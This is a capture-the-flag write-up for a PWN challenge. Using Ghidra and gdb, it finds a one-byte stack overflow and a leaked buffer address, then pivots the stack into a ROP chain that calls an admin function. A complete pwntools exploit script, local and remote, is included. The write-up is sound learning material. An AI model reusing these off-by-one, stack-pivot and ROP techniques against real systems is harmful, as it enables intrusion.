## Assignment

Category: PWN

Difficulty: Not specified

Our diagnostics terminal logged an anomaly during maintenance. The vendor insists their service is fortified with stack canaries and safe from memory corruption, but the interface IS LEAKING.

Can you forge a maintenance report, bypass the perimeter, and acquire administrative clearance?

Flag Format: CSSCTF{...}

`nc 34.116.80.78 7312`
## Reconnaissance

In this task, I start by analyzing the provided `.zip` file.

<img width="299" height="27" alt="Pasted image 20260930213005" src="https://github.com/user-attachments/assets/9c96b919-c09b-45a9-8c6e-0902672c88a3" />

Here we can see 3 files. By looking at the `Dockerfile`, we can understand what the server-side environment looks like.

<img width="518" height="349" alt="Pasted image 20260930213103" src="https://github.com/user-attachments/assets/95ed0c7e-6e49-4e7e-81c5-c796bc8a4aa3" />


I tried my luck reading `flag.txt`, but it was just a dummy flag to show how the setup works. 

<img width="371" height="31" alt="Pasted image 20260930213159" src="https://github.com/user-attachments/assets/3a30d32a-9543-4b8f-b45b-21d2bad1d968" />

That would be too easy xD.

To dive deeper, I analyzed the binary in Ghidra. I found that there is a code that leaks an address pointing to a buffer where the program loads data. There is also a custom stack canary (a value saved on the stack that is checked before the function returns).

<img width="522" height="75" alt="Pasted image 20260930214158" src="https://github.com/user-attachments/assets/1a03f99c-78b8-4975-80a8-28337488d009" />

At `0x401421`, the program saves a value into `RAX`, and at `0x40142a`, it writes it to memory at `RBP-8`. Then it is checked later here:

<img width="556" height="120" alt="Pasted image 20260930214353" src="https://github.com/user-attachments/assets/75792d65-4727-4aeb-97e0-20f5bf26fdff" />

Also the first read operation at `0x4013f8` is safe. There is nothing vulnerable here, as it reads `0x50` bytes into a `0x50`-byte space on the stack.

<img width="515" height="149" alt="Pasted image 20260930214753" src="https://github.com/user-attachments/assets/92301be5-36e1-4ff2-9ce5-9caa3a6aa9c8" />

However, a subsequent function call allocates `0x20` bytes of space but reads `0x21` bytes of data. This could be it!

<img width="670" height="708" alt="Pasted image 20260930214908" src="https://github.com/user-attachments/assets/1faf7191-3990-42e2-b1aa-a3ce6aa844ec" />

So lets examine it in gdb. 

## Buffer overflow

I wanted to check if it's possible to overwrite that single byte and see what resides right after the buffer. It should be the saved `RBP` (since it was the last register pushed to the stack). Let's begin by setting the first breakpoint before the first read (`0x4013f3`) and a second one before the second read (`0x40138d`).

<img width="259" height="58" alt="Pasted image 20260930220017" src="https://github.com/user-attachments/assets/12b151bd-fea9-4353-89dd-040e403a4e79" />

I ran the program and checked the `RBP` and `RSP` registers.

<img width="442" height="123" alt="Pasted image 20260930220852" src="https://github.com/user-attachments/assets/f30d0943-c585-41df-906a-443a8579e995" />

Then, I hit continue, provided a payload, and checked the new `RBP` and `RSP` values.

I also decided to inspect the stack. I could clearly see the saved previous `RBP`, followed by my `AAAA` payload. 

<img width="454" height="241" alt="Pasted image 20260930220943" src="https://github.com/user-attachments/assets/cd35bc9b-7ad6-45e1-b01f-00efb2b8b29c" />

To ensure I landed on the correct address, I checked the assembly.

<img width="476" height="305" alt="Pasted image 20260930220549" src="https://github.com/user-attachments/assets/a2833eed-e7a4-4502-81d9-b72f4c83457d" />

Next, I continued the execution and sent 33 `'A'`s (`0x21` bytes). The program crashed, which was a good sign (we probably corrupted the frame pointer).

<img width="393" height="154" alt="Pasted image 20260930231000" src="https://github.com/user-attachments/assets/a1bc8977-ac37-4960-a544-508ee5ea943e" />

After that, I ran it once more, this time without the first breakpoint, and successfully examined the stack data.

<img width="501" height="393" alt="Pasted image 20260930231105" src="https://github.com/user-attachments/assets/71edfce2-0edd-4ded-bde6-bcab715d2683" />

I confirmed that I was able to overwrite exactly one byte of the saved `RBP`. Now, all that was left was to exploit it.

## Exploitation

I further investigated the code in Ghidra and found the following function.

<img width="507" height="636" alt="Pasted image 20260930231420" src="https://github.com/user-attachments/assets/fb483e1f-f7b9-45a6-ac74-c5696e1a1073" />

And here is the decompiled representation of this assembly part.

<img width="724" height="742" alt="Pasted image 20260930231538" src="https://github.com/user-attachments/assets/d9a4b60c-5719-4706-be6e-9f58898b0f75" />

From this, we can see that to get the flag, we need to set `EDI` and `ESI` to `0xdeadbeef` and `0xcafebabe`, respectively.
Since we know the address of the first (secure) buffer from the initial leak, we can place a ROP chain (our gadget addresses and target values) in it. Then, we can use the one-byte overflow to change the least significant byte of the saved `RBP`, effectively pivoting the stack to point directly at our controlled buffer.
To achieve this, I needed to find ROP gadgets to load values into `EDI` and `ESI`. After a short search, I found instructions that pop into `RDI` and `RSI` (which are just the 64-bit extensions of `EDI` and `ESI`).

<img width="544" height="57" alt="Pasted image 20260930233351" src="https://github.com/user-attachments/assets/401b3b38-3350-4650-b031-80429a1bfa12" />

To test it, I wrote this script.

``` python
from pwn import *

context.binary = elf = ELF("./chall", checksec = False)

p = process("./chall")

POP_RDI = 0x40124d       # pop rdi ; ret
POP_RSI = 0x40124f       # pop rsi ; ret
ADMIN   = 0x401268       # function checking - 0xdeadbeef / 0xcafebabe

p.recvuntil(b"Report buffer allocated at: ")
buffer_addr = int(p.recvline().strip(), 16) #translate to text

log.info(f"Buffer: {hex(buffer_addr)}")


# 2. First input: construct our fake stack / ROP chain

payload = flat(
    0x0,             # fake RBP
    POP_RDI,         # pop rdi ; ret
    0xdeadbeef,
    POP_RSI,         # pop rsi ; ret
    0xcafebabe,
    ADMIN            # call admin function
)

# first 50 bytes
payload = payload.ljust(0x50, b"A")

assert len(payload) == 0x50

# send first payload
p.send(payload)

# We will use mask 0xff to obtain the last byte of address
payload2 = b"A" * 0x20 + p8(buffer_addr & 0xff)

assert len(payload2) == 0x21

# Send overflow payload
p.send(payload2)

p.interactive()
```

Note that this exploit might not work 100% of the time. Because of ASLR (Address Space Layout Randomization), the stack address alignment can shift slightly, meaning our one-byte overwrite might miss the exact start of our new stack address. This happened during local testing, but the solution is simple: just re-run the exploit until the alignment matches:)).

<img width="583" height="279" alt="Pasted image 20260930235612" src="https://github.com/user-attachments/assets/172e74c3-b4c5-4407-ae8e-77b67c4616b7" />

Finally, let's run it against the remote server.

<img width="539" height="168" alt="Pasted image 20260930235909" src="https://github.com/user-attachments/assets/85167334-05b6-4efb-9187-67dcd84fe9ad" />

BINGO! We obtain the flag.

final code:
``` python
from pwn import *

context.binary = elf = ELF("./chall", checksec = False)

p = remote('34.116.80.78', 7312) #remote
#p = process("./chall") #local

POP_RDI = 0x40124d       # pop rdi ; ret
POP_RSI = 0x40124f       # pop rsi ; ret
ADMIN   = 0x401268       # function checking - 0xdeadbeef / 0xcafebabe

p.recvuntil(b"Report buffer allocated at: ")
buffer_addr = int(p.recvline().strip(), 16) #translate to text

log.info(f"Buffer: {hex(buffer_addr)}")


# 2. First input: construct our fake stack / ROP chain

payload = flat(
    0x0,             # fake RBP
    POP_RDI,         # pop rdi ; ret
    0xdeadbeef,
    POP_RSI,         # pop rsi ; ret
    0xcafebabe,
    ADMIN            # call admin function
)

# first 50 bytes
payload = payload.ljust(0x50, b"A")

assert len(payload) == 0x50

# send first payload
p.send(payload)

# We will use mask 0xff to obtain the last byte of address
payload2 = b"A" * 0x20 + p8(buffer_addr & 0xff)

assert len(payload2) == 0x21

# Send overflow payload
p.send(payload2)

p.interactive()
```
